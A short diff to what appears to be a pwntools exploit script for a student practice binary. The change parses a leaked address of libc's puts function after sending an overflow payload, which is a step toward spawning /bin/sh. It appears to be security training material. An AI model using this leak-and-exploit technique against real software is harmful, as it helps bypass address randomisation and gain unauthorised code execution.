@@ -42,8 +42,16 @@ raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
 p.sendline(payload1)
-r = p.recvn(7)
-print(binascii.b2a_hex(r))
+
+leak = p.recvn(7) # receive address of __GI__IO_puts.
+leak = leak[::-1] # reverse byte order.
+leak = leak[1:] # slice off line-feed (0xa).
+
+# e.g. leak: b'7ffff7e4be10
+# x/i 0x7ffff7e4be10
+# 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14
+
+print(binascii.b2a_hex(leak))
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
